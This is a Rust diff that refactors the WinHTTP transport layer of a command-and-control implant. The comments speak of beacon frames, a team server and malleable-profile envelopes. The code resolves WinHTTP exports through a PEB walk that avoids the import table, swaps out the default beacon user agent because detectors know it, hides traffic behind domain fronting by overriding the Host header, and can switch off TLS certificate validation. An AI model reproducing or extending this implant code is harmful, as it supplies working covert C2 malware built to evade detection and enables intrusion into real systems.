@@ -133,6 +133,23 @@ pub unsafe fn ensure_winhttp() {
     if cur != 0 {
         return;
     }
+    if !ensure_winhttp_load_dll() {
+        // Can't load winhttp — mark as failed (sentinel 1) so we don't retry.
+        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
+        return;
+    }
+    match ensure_winhttp_resolve() {
+        Some(fns) => ensure_winhttp_install(fns),
+        None => {
+            // Export resolution failed — mark as failed.
+            let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
+        }
+    }
+}
+
+/// Force-load winhttp.dll via kernel32 LoadLibraryA (PEB-walk resolution, no
+/// IAT). Returns true when the module handle is non-null.
+unsafe fn ensure_winhttp_load_dll() -> bool {
     // winhttp.dll is NOT loaded by default — resolve LoadLibraryA from
     // kernel32 and force-load it into the process first.
     type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
@@ -146,11 +163,12 @@ pub unsafe fn ensure_winhttp() {
             winhttp_loaded = true;
         }
     }
-    if !winhttp_loaded {
-        // Can't load winhttp — mark as failed (sentinel 1) so we don't retry.
-        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
-        return;
-    }
+    winhttp_loaded
+}
+
+/// Resolve the WinHTTP exports and build the function table.
+/// Returns None when any required export is missing.
+unsafe fn ensure_winhttp_resolve() -> Option<alloc::boxed::Box<WinhttpFns>> {
     let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
     let c = export_addr(b"winhttp.dll", b"WinHttpConnect");
     let r = export_addr(b"winhttp.dll", b"WinHttpOpenRequest");
@@ -170,7 +188,7 @@ pub unsafe fn ensure_winhttp() {
     if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
         (o, c, r, s, v, d, cl, q)
     {
-        let fns = alloc::boxed::Box::new(WinhttpFns {
+        Some(alloc::boxed::Box::new(WinhttpFns {
             open: core::mem::transmute(o),
             connect: core::mem::transmute(c),
             open_request: core::mem::transmute(r),
@@ -192,18 +210,23 @@ pub unsafe fn ensure_winhttp() {
                 Some(a) => Some(core::mem::transmute(a)),
                 None => None,
             },
-        });
-        let ptr = alloc::boxed::Box::into_raw(fns) as usize;
-        // One-time install. If we lost the race, free our allocation.
-        match WINHTTP.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
-            Ok(_) => {}
-            Err(_) => {
-                drop(alloc::boxed::Box::from_raw(ptr as *mut WinhttpFns));
-            }
-        }
+        }))
     } else {
-        // Export resolution failed — mark as failed.
-        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
+        None
+    }
+}
+
+/// One-time install of the resolved table into the static. If we lost the
+/// race with a concurrent initializer, free our allocation.
+unsafe fn ensure_winhttp_install(fns: alloc::boxed::Box<WinhttpFns>) {
+    use core::sync::atomic::Ordering;
+    let ptr = alloc::boxed::Box::into_raw(fns) as usize;
+    // One-time install. If we lost the race, free our allocation.
+    match WINHTTP.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
+        Ok(_) => {}
+        Err(_) => {
+            drop(alloc::boxed::Box::from_raw(ptr as *mut WinhttpFns));
+        }
     }
 }
 
@@ -229,6 +252,52 @@ pub unsafe fn post_frame(
     body: &[u8],
     use_tls: bool,
 ) -> Option<Vec<u8>> {
+    let fns = match post_frame_fns() {
+        Some(f) => f,
+        None => return None,
+    };
+    let ua = post_frame_user_agent();
+    let session = match post_frame_open_session(fns, &ua) {
+        Some(s) => s,
+        None => return None,
+    };
+    let conn = match post_frame_connect(fns, session, host, port) {
+        Some(c) => c,
+        None => return None,
+    };
+    let req = match post_frame_open_request(fns, session, conn, path, use_tls) {
+        Some(r) => r,
+        None => return None,
+    };
+    post_frame_disable_redirects(fns, req);
+    let (cheaders, wire_body, data_header) = post_frame_shape_envelope(body);
+    if !post_frame_add_headers(fns, req, &cheaders, &data_header) {
+        close_winhttp_chain(fns, req, conn, session);
+        return None;
+    }
+    if !post_frame_maybe_relax_cert(fns, req, use_tls) {
+        close_winhttp_chain(fns, req, conn, session);
+        return None;
+    }
+    if !post_frame_send(fns, req, &wire_body) {
+        close_winhttp_chain(fns, req, conn, session);
+        return None;
+    }
+    // WinHttpReceiveResponse.
+    if (fns.receive_response)(req, core::ptr::null()) == 0 {
+        close_winhttp_chain(fns, req, conn, session);
+        return None;
+    }
+    let out = match post_frame_read_response(fns, req, conn, session) {
+        Some(o) => o,
+        None => return None,
+    };
+    post_frame_finish(fns, req, conn, session, out)
+}
+
+/// Load the resolved WinHTTP table. Returns None when the transport is
+/// unavailable (0 = not attempted, 1 = init failed).
+unsafe fn post_frame_fns() -> Option<&'static WinhttpFns> {
     ensure_winhttp();
     let ptr = WINHTTP.load(core::sync::atomic::Ordering::Acquire);
     // 0 = not attempted, 1 = init failed. Both mean no transport available.
@@ -237,17 +306,25 @@ pub unsafe fn post_frame(
     }
     // SAFETY: pointer was stored by ensure_winhttp via Box::leak; it lives
     // for the process lifetime and is never freed.
-    let fns = unsafe { &*(ptr as *const WinhttpFns) };
-    // User-agent: the profile's `set useragent` (baked at build) overrides the
-    // transport default. CS's default beacon UA is a well-known IOC, so a real
-    // engagement sets one in the profile.
+    Some(unsafe { &*(ptr as *const WinhttpFns) })
+}
+
+/// User-agent: the profile's `set useragent` (baked at build) overrides the
+/// transport default. CS's default beacon UA is a well-known IOC, so a real
+/// engagement sets one in the profile.
+fn post_frame_user_agent() -> Vec<u16> {
     let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
         b"Mozilla/5.0"
     } else {
         crate::envelopes::POST_CLIENT_UA
     };
-    let ua = to_utf16(ua_bytes);
-    // WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0.
+    to_utf16(ua_bytes)
+}
+
+/// WinHttpOpen: WINHTTP_ACCESS_TYPE_DEFAULT_PROXY=0, flags=0. Sets the
+/// per-session 10 s timeouts (resolve/connect/send/receive). A failure to set
+/// timeouts is non-fatal — the session still works with WinHTTP defaults.
+unsafe fn post_frame_open_session(fns: &WinhttpFns, ua: &[u16]) -> Option<HINTERNET> {
     let session = (fns.open)(ua.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0);
     if session.is_null() {
         return None;
@@ -265,12 +342,34 @@ pub unsafe fn post_frame(
             WINHTTP_TIMEOUT_MS,
         );
     }
+    Some(session)
+}
+
+/// WinHttpConnect to `host:port`; closes the session on failure.
+unsafe fn post_frame_connect(
+    fns: &WinhttpFns,
+    session: HINTERNET,
+    host: &[u8],
+    port: u16,
+) -> Option<HINTERNET> {
     let host16 = to_utf16(host);
     let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
     if conn.is_null() {
         (fns.close_handle)(session);
         return None;
     }
+    Some(conn)
+}
+
+/// WinHttpOpenRequest with WINHTTP_FLAG_SECURE when use_tls; closes the
+/// request's ancestors (conn + session) on failure.
+unsafe fn post_frame_open_request(
+    fns: &WinhttpFns,
+    session: HINTERNET,
+    conn: HINTERNET,
+    path: &[u8],
+    use_tls: bool,
+) -> Option<HINTERNET> {
     let path16 = to_utf16(path);
     let verb = to_utf16(b"POST");
     // WinHttpOpenRequest: WINHTTP_FLAG_SECURE (0x00800000) when use_tls, else 0.
@@ -290,11 +389,15 @@ pub unsafe fn post_frame(
         (fns.close_handle)(session);
         return None;
     }
-    // 3xx redirects are NOT a working beacon round-trip: following them (the
-    // WinHTTP default) would deliver the encrypted frame to an unintended
-    // target and mask a dead endpoint as a success. Disabling redirects makes
-    // WinHTTP fail the request on any 3xx → this function returns None → the
-    // fallback chain takes over. Must be set BEFORE the first send.
+    Some(req)
+}
+
+/// 3xx redirects are NOT a working beacon round-trip: following them (the
+/// WinHTTP default) would deliver the encrypted frame to an unintended
+/// target and mask a dead endpoint as a success. Disabling redirects makes
+/// WinHTTP fail the request on any 3xx → this function returns None → the
+/// fallback chain takes over. Must be set BEFORE the first send.
+unsafe fn post_frame_disable_redirects(fns: &WinhttpFns, req: HINTERNET) {
     if let Some(set_opt) = fns.set_option {
         let disable: u32 = WINHTTP_DISABLE_REDIRECTS;
         let _ = set_opt(
@@ -304,6 +407,18 @@ pub unsafe fn post_frame(
             4,
         );
     }
+}
+
+/// Envelope shaping (profile-driven, done BEFORE send): encode the body via
+/// the client steps, and when the client-block terminator is a header, move
+/// the encoded bytes into a data header instead of the wire body.
+fn post_frame_shape_envelope(
+    body: &[u8],
+) -> (
+    crate::heap::Vec<(&'static [u8], &'static [u8])>,
+    Vec<u8>,
+    Option<(Vec<u8>, Vec<u8>)>,
+) {
     // ---- Envelope shaping (profile-driven, done BEFORE send) ----
     let csteps = crate::envelopes::post_client_steps();
     let cterm = crate::envelopes::post_client_terminator();
@@ -315,8 +430,21 @@ pub unsafe fn post_frame(
         }
         _ => (shaped, None),
     };
+    (cheaders, wire_body, data_header)
+}
 
-    // Collect static client-block headers + (if header-terminator) the data header.
+/// Collect the profile's static client-block headers + (if header-terminator)
+/// the data header and add them to the request. Returns false when the header
+/// add fails — the profile's static client-block headers (and in the
+/// header-terminator case the ENTIRE frame, since wire_body is empty) ride in
+/// these headers, so a failed add is a channel failure (the caller closes the
+/// handle chain and lets the fallback chain pick another transport).
+unsafe fn post_frame_add_headers(
+    fns: &WinhttpFns,
+    req: HINTERNET,
+    cheaders: &crate::heap::Vec<(&'static [u8], &'static [u8])>,
+    data_header: &Option<(Vec<u8>, Vec<u8>)>,
+) -> bool {
     if let Some(add_req_headers) = fns.add_request_headers {
         let mut hdr: Vec<u8> = Vec::new();
         for &(n, v) in cheaders.iter() {
@@ -342,14 +470,23 @@ pub unsafe fn post_frame(
             // a channel failure and let the fallback chain pick another
             // transport.
             if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000) == 0 {
-                (fns.close_handle)(req);
-                (fns.close_handle)(conn);
-                (fns.close_handle)(session);
-                return None;
+                return false;
             }
         }
     }
+    true
+}
 
+/// WinHttpSendRequest with optional TLS cert-ignore. Default: strict cert
+/// validation — failure returns None immediately. When NYX_TLS_INSECURE=1 is
+/// set at build time, relax cert validation BEFORE the first send (WinHTTP
+/// requires SECURITY_FLAGS set before WinHttpSendRequest; setting them after
+/// a failed send is rejected or silently ignored, so the old post-failure
+/// retry never actually relaxed). Returns false on any failure (the caller
+/// closes the handle chain).
+///
+/// NOTE: WINHTTP_OPTION_SECURITY_FLAGS = 31 (0x1F), not 32.
+unsafe fn post_frame_maybe_relax_cert(fns: &WinhttpFns, req: HINTERNET, use_tls: bool) -> bool {
     // ---- WinHttpSendRequest with optional TLS cert-ignore ----
     // Default: strict cert validation — failure returns None immediately.
     // When NYX_TLS_INSECURE=1 is set at build time, relax cert validation
@@ -364,7 +501,7 @@ pub unsafe fn post_frame(
             | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
         let set_opt = match fns.set_option {
             Some(f) => f,
-            None => return None,
+            None => return false,
         };
         if set_opt(
             req,
@@ -374,12 +511,15 @@ pub unsafe fn post_frame(
         ) == 0
         {
             // Could not set relaxation flags — abort rather than send strict.
-            (fns.close_handle)(req);
-            (fns.close_handle)(conn);
-            (fns.close_handle)(session);
-            return None;
+            return false;
         }
     }
+    true
+}
+
+/// WinHttpSendRequest with the shaped wire body. Returns false on failure
+/// (the caller closes the handle chain).
+unsafe fn post_frame_send(fns: &WinhttpFns, req: HINTERNET, wire_body: &[u8]) -> bool {
     let ok = (fns.send_request)(
         req,
         core::ptr::null(),
@@ -389,19 +529,17 @@ pub unsafe fn post_frame(
         wire_body.len() as u32,
         0,
     );
-    if ok == 0 {
-        (fns.close_handle)(req);
-        (fns.close_handle)(conn);
-        (fns.close_handle)(session);
-        return None;
-    }
-    // WinHttpReceiveResponse.
-    if (fns.receive_response)(req, core::ptr::null()) == 0 {
-        (fns.close_handle)(req);
-        (fns.close_handle)(conn);
-        (fns.close_handle)(session);
-        return None;
-    }
+    ok != 0
+}
+
+/// Read the response body in bounded chunks. Returns None when the accumulated
+/// size would exceed MAX_RESPONSE_BYTES (closing the handle chain first).
+unsafe fn post_frame_read_response(
+    fns: &WinhttpFns,
+    req: HINTERNET,
+    conn: HINTERNET,
+    session: HINTERNET,
+) -> Option<Vec<u8>> {
     // Read the response body.
     let mut out: Vec<u8> = Vec::new();
     #[allow(unused_assignments)]
@@ -441,25 +579,47 @@ pub unsafe fn post_frame(
         }
         out.extend_from_slice(&chunk[..n]);
     }
-    // Invert the http-post SERVER envelope (the response direction). The team
-    // server applied `shape_beacon_response` (print/none/uri-append → bytes in
-    // the body; header → a response header the implant doesn't read yet). With
-    // no profile the steps are empty and this is a no-op. On decode failure keep
-    // the raw bytes so the frame parse fails loudly instead of silently dropping.
+    Some(out)
+}
+
+/// Invert the http-post SERVER envelope (the response direction). The team
+/// server applied `shape_beacon_response` (print/none/uri-append → bytes in
+/// the body; header → a response header the implant doesn't read yet). With
+/// no profile the steps are empty and this is a no-op. On decode failure keep
+/// the raw bytes so the frame parse fails loudly instead of silently dropping.
+fn post_frame_invert_server_envelope(out: &mut Vec<u8>) {
     let ssteps = crate::envelopes::post_server_steps();
     if !ssteps.is_empty() {
-        if let Ok(decoded) = nyx_profile::decode(&ssteps, &out) {
-            out = decoded;
+        if let Ok(decoded) = nyx_profile::decode(&ssteps, out) {
+            *out = decoded;
         }
     }
-    (fns.close_handle)(req);
-    (fns.close_handle)(conn);
-    (fns.close_handle)(session);
+}
+
+/// Invert the server envelope, close the handle chain, and map an empty
+/// response body to None (same order as the original tail of post_frame).
+unsafe fn post_frame_finish(
+    fns: &WinhttpFns,
+    req: HINTERNET,
+    conn: HINTERNET,
+    session: HINTERNET,
+    mut out: Vec<u8>,
+) -> Option<Vec<u8>> {
+    post_frame_invert_server_envelope(&mut out);
+    close_winhttp_chain(fns, req, conn, session);
     if out.is_empty() {
         None
     } else {
         Some(out)
     }
+}
+
+/// Close the request/connection/session handle chain (same order everywhere:
+/// req → conn → session).
+unsafe fn close_winhttp_chain(fns: &WinhttpFns, req: HINTERNET, conn: HINTERNET, session: HINTERNET) {
+    (fns.close_handle)(req);
+    (fns.close_handle)(conn);
+    (fns.close_handle)(session);
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -511,30 +671,75 @@ pub unsafe fn post_frame_enhanced(
     use_tls: bool,
     opts: &HttpOpts<'_>,
 ) -> Option<Vec<u8>> {
-    ensure_winhttp();
-    let ptr = WINHTTP.load(core::sync::atomic::Ordering::Acquire);
-    if ptr <= 1 {
+    let fns = match post_frame_fns() {
+        Some(f) => f,
+        None => return None,
+    };
+    let ua = post_frame_enhanced_user_agent();
+    let session = match post_frame_enhanced_open_session(fns, &ua, opts.proxy_url) {
+        Some(s) => s,
+        None => return None,
+    };
+    let conn = match post_frame_enhanced_connect(fns, session, connect_host, port) {
+        Some(c) => c,
+        None => return None,
+    };
+    let req = match post_frame_enhanced_open_request(fns, session, conn, path, use_tls) {
+        Some(r) => r,
+        None => return None,
+    };
+    post_frame_enhanced_disable_redirects(fns, req);
+    let (cheaders, wire_body, data_header) = post_frame_enhanced_shape_envelope(body);
+    if !post_frame_enhanced_add_headers(fns, req, &cheaders, &data_header, opts.fronting_host) {
+        close_winhttp_chain(fns, req, conn, session);
         return None;
     }
-    // SAFETY: pointer was stored by ensure_winhttp via Box::leak; it lives
-    // for the process lifetime and is never freed.
-    let fns = unsafe { &*(ptr as *const WinhttpFns) };
+    if !post_frame_enhanced_maybe_relax_cert(fns, req, use_tls) {
+        close_winhttp_chain(fns, req, conn, session);
+        return None;
+    }
+    if !post_frame_enhanced_send(fns, req, &wire_body) {
+        close_winhttp_chain(fns, req, conn, session);
+        return None;
+    }
+    if (fns.receive_response)(req, core::ptr::null()) == 0 {
+        close_winhttp_chain(fns, req, conn, session);
+        return None;
+    }
+    let out = match post_frame_enhanced_read_response(fns, req, conn, session) {
+        Some(o) => o,
+        None => return None,
+    };
+    post_frame_finish(fns, req, conn, session, out)
+}
 
+/// User-agent selection — same as post_frame.
+fn post_frame_enhanced_user_agent() -> Vec<u16> {
     let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
         b"Mozilla/5.0"
     } else {
         crate::envelopes::POST_CLIENT_UA
     };
-    let ua = to_utf16(ua_bytes);
+    to_utf16(ua_bytes)
+}
 
+/// WinHttpOpen with proxy if configured. When proxy_url is set, use
+/// WINHTTP_ACCESS_TYPE_NAMED_PROXY (3) and pass the proxy as the lpszProxy
+/// parameter. Otherwise use DEFAULT_PROXY (0), same as the plain post_frame
+/// path. Sets the per-session 10 s timeouts afterwards.
+unsafe fn post_frame_enhanced_open_session(
+    fns: &WinhttpFns,
+    ua: &[u16],
+    proxy_url: &[u8],
+) -> Option<HINTERNET> {
     // ---- WinHttpOpen with proxy if configured ----
     // When proxy_url is set, use WINHTTP_ACCESS_TYPE_NAMED_PROXY (3) and pass
     // the proxy as the lpszProxy parameter. Otherwise use DEFAULT_PROXY (0),
     // same as the plain post_frame path.
-    let (access_type, proxy_w) = if opts.proxy_url.is_empty() {
+    let (access_type, proxy_w) = if proxy_url.is_empty() {
         (0u32, None::<Vec<u16>>)
     } else {
-        let pw = to_utf16(opts.proxy_url);
+        let pw = to_utf16(proxy_url);
         (WINHTTP_ACCESS_TYPE_NAMED_PROXY, Some(pw))
     };
     let session = match &proxy_w {
@@ -566,7 +771,17 @@ pub unsafe fn post_frame_enhanced(
             WINHTTP_TIMEOUT_MS,
         );
     }
+    Some(session)
+}
 
+/// WinHttpConnect to the actual connect_host (CDN IP or redirector); closes
+/// the session on failure.
+unsafe fn post_frame_enhanced_connect(
+    fns: &WinhttpFns,
+    session: HINTERNET,
+    connect_host: &[u8],
+    port: u16,
+) -> Option<HINTERNET> {
     // ---- WinHttpConnect to the actual connect_host (CDN IP or redirector) ----
     let host16 = to_utf16(connect_host);
     let conn = (fns.connect)(session, host16.as_ptr(), port, 0);
@@ -574,7 +789,18 @@ pub unsafe fn post_frame_enhanced(
         (fns.close_handle)(session);
         return None;
     }
+    Some(conn)
+}
 
+/// WinHttpOpenRequest with WINHTTP_FLAG_SECURE when use_tls; closes the
+/// request's ancestors (conn + session) on failure.
+unsafe fn post_frame_enhanced_open_request(
+    fns: &WinhttpFns,
+    session: HINTERNET,
+    conn: HINTERNET,
+    path: &[u8],
+    use_tls: bool,
+) -> Option<HINTERNET> {
     let path16 = to_utf16(path);
     let verb = to_utf16(b"POST");
     let secure_flag = if use_tls { WINHTTP_FLAG_SECURE } else { 0 };
@@ -593,8 +819,12 @@ pub unsafe fn post_frame_enhanced(
         (fns.close_handle)(session);
         return None;
     }
-    // 3xx redirects → channel failure (same rationale as post_frame). Must be
-    // set BEFORE the first send.
+    Some(req)
+}
+
+/// 3xx redirects → channel failure (same rationale as post_frame). Must be
+/// set BEFORE the first send.
+unsafe fn post_frame_enhanced_disable_redirects(fns: &WinhttpFns, req: HINTERNET) {
     if let Some(set_opt) = fns.set_option {
         let disable: u32 = WINHTTP_DISABLE_REDIRECTS;
         let _ = set_opt(
@@ -604,7 +834,16 @@ pub unsafe fn post_frame_enhanced(
             4,
         );
     }
+}
 
+/// Envelope shaping (same as post_frame).
+fn post_frame_enhanced_shape_envelope(
+    body: &[u8],
+) -> (
+    crate::heap::Vec<(&'static [u8], &'static [u8])>,
+    Vec<u8>,
+    Option<(Vec<u8>, Vec<u8>)>,
+) {
     // ---- Envelope shaping (same as post_frame) ----
     let csteps = crate::envelopes::post_client_steps();
     let cterm = crate::envelopes::post_client_terminator();
@@ -616,7 +855,21 @@ pub unsafe fn post_frame_enhanced(
         }
         _ => (shaped, None),
     };
+    (cheaders, wire_body, data_header)
+}
 
+/// Collect headers: profile static + data-header + fronting Host, and add
+/// them to the request. Returns false on a failed add — the fronting Host
+/// header (and in the header-terminator case the whole frame) rides in these
+/// headers, so a failed add is a channel failure (the caller closes the
+/// handle chain).
+unsafe fn post_frame_enhanced_add_headers(
+    fns: &WinhttpFns,
+    req: HINTERNET,
+    cheaders: &crate::heap::Vec<(&'static [u8], &'static [u8])>,
+    data_header: &Option<(Vec<u8>, Vec<u8>)>,
+    fronting_host: &[u8],
+) -> bool {
     // ---- Collect headers: profile static + data-header + fronting Host ----
     if let Some(add_req_headers) = fns.add_request_headers {
         let mut hdr: Vec<u8> = Vec::new();
@@ -637,9 +890,9 @@ pub unsafe fn post_frame_enhanced(
         // Domain fronting: override the Host header. WinHttpAddRequestHeaders
         // with WINHTTP_ADDREQ_FLAG_ADD_OR_REPLACE (0x80000000) replaces the
         // auto-generated Host: <connect_host> with the fronting domain.
-        if !opts.fronting_host.is_empty() {
+        if !fronting_host.is_empty() {
             hdr.extend_from_slice(b"Host: ");
-            hdr.extend_from_slice(opts.fronting_host);
+            hdr.extend_from_slice(fronting_host);
             hdr.extend_from_slice(b"\r\n");
         }
         if !hdr.is_empty() {
@@ -649,14 +902,16 @@ pub unsafe fn post_frame_enhanced(
             // fronting Host header (and in the header-terminator case the whole
             // frame) rides in these headers; a failed add is a channel failure.
             if add_req_headers(req, hdr16.as_ptr(), hdr_len, 0x8000_0000) == 0 {
-                (fns.close_handle)(req);
-                (fns.close_handle)(conn);
-                (fns.close_handle)(session);
-                return None;
+                return false;
             }
         }
     }
+    true
+}
 
+/// Send request (with cert-ignore, same pre-send approach as post_frame).
+/// Returns false on any failure (the caller closes the handle chain).
+unsafe fn post_frame_enhanced_maybe_relax_cert(fns: &WinhttpFns, req: HINTERNET, use_tls: bool) -> bool {
     // ---- Send request (with cert-ignore, same pre-send approach as post_frame) ----
     let can_relax_cert = use_tls && fns.set_option.is_some() && tls_insecure_retry();
     if can_relax_cert {
@@ -665,7 +920,7 @@ pub unsafe fn post_frame_enhanced(
             | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
         let set_opt = match fns.set_option {
             Some(f) => f,
-            None => return None,
+            None => return false,
         };
         if set_opt(
             req,
@@ -674,12 +929,16 @@ pub unsafe fn post_frame_enhanced(
             4,
         ) == 0
         {
-            (fns.close_handle)(req);
-            (fns.close_handle)(conn);
-            (fns.close_handle)(session);
-            return None;
+            // Could not set relaxation flags — abort rather than send strict.
+            return false;
         }
     }
+    true
+}
+
+/// WinHttpSendRequest with the shaped wire body. Returns false on failure
+/// (the caller closes the handle chain).
+unsafe fn post_frame_enhanced_send(fns: &WinhttpFns, req: HINTERNET, wire_body: &[u8]) -> bool {
     let ok = (fns.send_request)(
         req,
         core::ptr::null(),
@@ -689,20 +948,18 @@ pub unsafe fn post_frame_enhanced(
         wire_body.len() as u32,
         0,
     );
-    if ok == 0 {
-        (fns.close_handle)(req);
-        (fns.close_handle)(conn);
-        (fns.close_handle)(session);
-        return None;
-    }
+    ok != 0
+}
 
-    if (fns.receive_response)(req, core::ptr::null()) == 0 {
-        (fns.close_handle)(req);
-        (fns.close_handle)(conn);
-        (fns.close_handle)(session);
-        return None;
-    }
-
+/// Read response (same bounded-read logic as post_frame). Returns None when
+/// the accumulated size would exceed MAX_RESPONSE_BYTES (closing the handle
+/// chain first).
+unsafe fn post_frame_enhanced_read_response(
+    fns: &WinhttpFns,
+    req: HINTERNET,
+    conn: HINTERNET,
+    session: HINTERNET,
+) -> Option<Vec<u8>> {
     // ---- Read response (same bounded-read logic as post_frame) ----
     let mut out: Vec<u8> = Vec::new();
     #[allow(unused_assignments)]
@@ -727,20 +984,5 @@ pub unsafe fn post_frame_enhanced(
         }
         out.extend_from_slice(&chunk[..n]);
     }
-
-    // Invert server envelope (same as post_frame).
-    let ssteps = crate::envelopes::post_server_steps();
-    if !ssteps.is_empty() {
-        if let Ok(decoded) = nyx_profile::decode(&ssteps, &out) {
-            out = decoded;
-        }
-    }
-    (fns.close_handle)(req);
-    (fns.close_handle)(conn);
-    (fns.close_handle)(session);
-    if out.is_empty() {
-        None
-    } else {
-        Some(out)
-    }
+    Some(out)
 }
